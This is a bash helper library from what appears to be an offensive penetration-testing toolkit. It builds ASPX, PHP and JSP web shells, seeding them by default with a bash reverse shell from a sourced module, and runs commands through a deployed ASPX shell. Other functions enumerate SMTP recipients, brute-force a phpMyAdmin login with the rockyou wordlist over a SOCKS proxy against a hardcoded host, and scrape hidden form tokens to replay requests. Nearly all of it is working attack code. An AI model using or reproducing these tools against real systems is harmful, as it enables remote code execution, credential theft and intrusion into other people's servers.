#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/reverse_shell.sh
source $SCRIPTDIR/network.sh
source $SCRIPTDIR/project.sh
get_http_form() {
    local url=$1
    if [ -z "$url" ]; then
        echo "Usage: get_http_form <url>"
        return 1
    fi
    curl -s $url | awk '/<form/  { print; while (getline > 0 && !/\/form>/) {print;}; print;  next}'

}


extract_hidden_input() {
    # Extract hidden inputs and format for curl -F
    local page=$1
    local target_form=$2
    echo "$page" | awk -v target_form="$target_form" '
    BEGIN { 

        form_data = ""
        in_form = 0
        form_counter = 0
        current_form_id = ""
        target_form_found = 0
    }
    /<form[^>]*>/ {
        in_form = 1
        form_counter++
        current_form_id = ""
        
        # Extract form id if present
        if (match($0, /id="([^"]*)"/, arr)) {
            current_form_id = arr[1]
        } else if (match($0, /id='\''([^'\'']*)'\''/, arr)) {
            current_form_id = arr[1]
        }
        
        # If no target form specified, use first form
        # If target form specified, check if this is the one
        if (target_form == "" && form_counter == 1) {
            target_form_found = 1
        } else if (target_form != "" && current_form_id == target_form) {
            target_form_found = 1
        } else if (target_form != "" && target_form ~ /^[0-9]+$/ && form_counter == target_form) {
            # Allow targeting by form number (1, 2, 3, etc.)
            target_form_found = 1
        } else {
            target_form_found = 0
        }
        
        next
    }
    /<\/form>/ {
        in_form = 0
        target_form_found = 0
        next
    }
    in_form && target_form_found {
        # Process multiple input tags on the same line
        line = $0
        while (match(line, /<input[^>]*type="hidden"[^>]*>/, input_match)) {
            input_tag = substr(line, RSTART, RLENGTH)
            
            # Extract name and value attributes from this specific input tag
            name = ""
            value = ""
            
            # Match name attribute
            if (match(input_tag, /name="([^"]*)"/, arr)) {
                name = arr[1]
            } else if (match(input_tag, /name='\''([^'\'']*)'\''/, arr)) {
                name = arr[1]
            } else if (match(input_tag, /name=([^[:space:]>]+)/, arr)) {
                name = arr[1]
            }
            
            # Match value attribute
            if (match(input_tag, /value="([^"]*)"/, arr)) {
                value = arr[1]
            } else if (match(input_tag, /value='\''([^'\'']*)'\''/, arr)) {
                value = arr[1]
            } else if (match(input_tag, /value=([^[:space:]>]+)/, arr)) {
                value = arr[1]
            }
            
            # Add to form data if name exists
            if (name != "") {
                if (form_data != "") {
                    form_data = form_data ","
                }
                form_data = form_data name "=" value
            }
            
            # Remove the processed input tag and continue with the rest of the line
            line = substr(line, RSTART + RLENGTH)
        }
        
    }
    END {
        print form_data
    }'


}



get_hidden_inputs() {
    local url="$1"
    local target_form="$2"
    if [[ -z "$url" ]]; then
        echo "Usage: get_hidden_inputs <url>" >> $trail_log
        return 1
    fi
    if [[ -z "$cookie_jar" ]]; then
        cookie_jar="cookie.txt"
    fi
    local proxy_option=""
    if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == "true" ]]; then
        if [[ -z "$proxy_target" ]] || [[ -z "$proxy_port" ]]; then
            echo "Proxy target or port is not set." >> $trail_log 
            return 1
        fi
        proxy_option="-x socks5://$proxy_target:$proxy_port"
        echo "Using $proxy_option" >> $trail_log
    fi
    #echo curl -c $cookie_jar -s "$url" $proxy_option 
    local page=$(curl -c $cookie_jar -s $proxy_option  "$url")
    if [[ -z "$page" ]]; then
        echo "Failed to fetch the page. Please check the URL." >> $trail_log
        return 1
    fi
    extract_hidden_input "$page" "$target_form"
}

get_iis_hidden_input() {
    local url="$1"
    local target_form="$2"
    local hidden_inputs=$(get_hidden_inputs "$url" "$target_form")
    hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
    hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/ -F /g')
    hidden_inputs="-F $hidden_inputs"
    echo $hidden_inputs
}

get_post_hidden_inputs() {
    local url="$1"
    local target_form="$2"
    local hidden_inputs=$(get_hidden_inputs "$url" "$target_form")
    hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
    hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/\&/g')
    echo $hidden_inputs
}


create_aspx_webshell() {

    cp $SCRIPTDIR/../aspx/webshell.aspx .

}

run_aspx_shell_command() {

    if [[ -z "$target_url" ]]; then
        echo "Target URL is not set."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "Command to execute is not set."
        return 1
    fi
    local proxy_option=""
    local hidden_inputs=$(get_iis_hidden_input "$target_url")
    echo $hidden_inputs
    curl -b $cookie_jar -c $cookie_jar $target_url \
    -F "txtCommand=$cmd" \
    -F "btnExecute=Execute" \
    $hidden_inputs $proxy_option

}


create_php_web_shell() {
    cp $SCRIPTDIR/../php/webshell.php .
    if [ -z "$cmd" ]; then
        cmd=$(get_bash_reverse_shell)
    fi
    local cmd_replacement=$(escape_sed "$cmd")
    cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
    sed -E -i "s/\{cmd\}/$cmd_replacement/g" webshell.php
    
    if [[ ! -z "$return_minimal" ]] && [[ "$return_minimal" == "true" ]]; then
        sed -E -i '/html/d' webshell.php
        sed -E -i '/body/d' webshell.php
        sed -E -i '/title/d' webshell.php
        sed -E -i '/head/d' webshell.php
    fi
}

create_jsp_webshell() {
    cp $SCRIPTDIR/../jsp/webshell.jsp .
    if [ -z "$cmd" ]; then
        cmd=$(get_bash_reverse_shell)
    fi
    local cmd_replacement=$(escape_sed "$cmd")
    cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
    sed -E -i "s/\{cmd\}/$cmd_replacement/g" webshell.jsp
    
    if [[ ! -z "$return_minimal" ]] && [[ "$return_minimal" == "true" ]]; then
        sed -E -i '/html/d' webshell.jsp
        sed -E -i '/body/d' webshell.jsp
        sed -E -i '/title/d' webshell.jsp
        sed -E -i '/head/d' webshell.jsp
    fi
}

run_curl() {

    local url=$1
    if [[ -z $url ]]; then
        echo "Usage: run_curl <url>"
        return 1
    fi
    if [[ -z $use_proxychain ]] || [[ $use_proxychain == "false" ]]; then
        curl -s "$url"
    else
        curl -s "$url" --proxy "socks5://$proxy_target:$proxy_port"
    fi
}

enumerate_smtp_auth() {
    if [[ -z $target_ip ]]; then
        echo "Target IP is not set."
        return 1
    fi
    if [[ -z $smtp_client_host ]]; then
        echo "SMTP client host is not set."
        return 1
    fi
    if [[ -z $smtp_username ]]; then
        echo "SMTP username is not set."
        return 1
    fi
    if [[ -z $smtp_password ]]; then
        echo "SMTP password is not set."
        return 1
    fi
    if [[ -z $target_users ]]; then
        target_users=users.txt
        if [[ ! -f $target_users ]]; then
            echo "Target users file $target_users does not exist."
            return 1
        fi
    fi
    # Enumerate SMTP services
    sleep_time=0.05
    echo "Enumerating SMTP services on $target_ip..."
    {
        ( 
        echo "HELO $smtp_client_host" 
        sleep $sleep_time
        echo 'AUTH LOGIN'
        sleep $sleep_time
        echo -n "$smtp_username" | base64 
        sleep $sleep_time
        echo -n "$smtp_password" | base64 
        sleep $sleep_time
        echo "MAIL FROM:$smtp_username"
        sleep $sleep_time
        while IFS= read -r target_user; do
            echo "RCPT TO:$target_user"
            sleep $sleep_time
        done < $target_users
        echo 'QUIT'
        ) | tee >(cat >&2) | telnet $target_ip 25
    } >> smtp.log 2>&1
}

perform_phpmyadmin_attack() {
    
    for password in $(cat /usr/share/wordlists/rockyou.txt); do
        #echo curl -x "socks5://127.0.0.1:1080" -b "$cookie_jar" -c "$cookie_jar" -d "$hidden_inputs&pma_username=root&pma_password=$password" "http://172.16.83.20/phpMyAdmin/index.php"
        #hidden_inputs=$(get_post_hidden_inputs "http://172.16.83.20:80/phpMyAdmin/index.php" "login_form" )
        #echo $hidden_inputs
        page=$(curl -x "socks5://127.0.0.1:1080" -b "$cookie_jar" -c "$cookie_jar" -s -d "$hidden_inputs&pma_username=andrew&pma_password=$password" "http://172.16.83.20/phpMyAdmin/index.php")
        if echo "$page" | grep "Access denied"; then
            echo "Password not found: $password"
            #echo page=$page
            set_session=$(echo $page | grep -oP 'name="set_session" value="\K[^"]+')
            token=$(echo $page | grep -oP 'name="token" value="\K[^"]+' | head -n 1)
            hidden_inputs="set_session=$set_session&token=$token"
            #hidden_inputs=$(extract_hidden_input "$page" "login_form")
            #hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
            #hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/\&/g')
            echo $hidden_inputs
        else
            echo "$page" 
            echo "Password found: $password"
            break
        fi
    done


}

download_web_folder() {
    if [[ -z $download_folder ]]; then
        download_folder="download"
    fi
    if [[ ! -d "$download_folder" ]]; then
        mkdir -p "$download_folder"
    fi
    pushd "$download_folder" || return 1
    if [[ ! -z "$1" ]]; then
        target_url="$1"
    fi
    if [[ -z "$target_url" ]]; then
        echo "Target URL is not set."
        return 1
    fi
    wget -r -nH -R 'index.html*' --no-parent $target_url
    popd || return 1
}

generate_php_hash() {
    if [[ -z "$password" ]]; then
        echo "Password is not set."
        return 1
    fi
    local php_password=$password
    if [[ -z "$php_password_algorithm" ]]; then
        php_password_algorithm=PASSWORD_DEFAULT
    fi
    cp $SCRIPTDIR/../php/password_hash.php .
    local php_password=$(escape_sed $password)
    php_password_algorithm=$(escape_sed $php_password_algorithm)
    sed -E -i "s/\{php_password\}/$php_password/g" password_hash.php
    sed -E -i "s/\{php_password_algorithm\}/$php_password_algorithm/g" password_hash.php
    php password_hash.php
}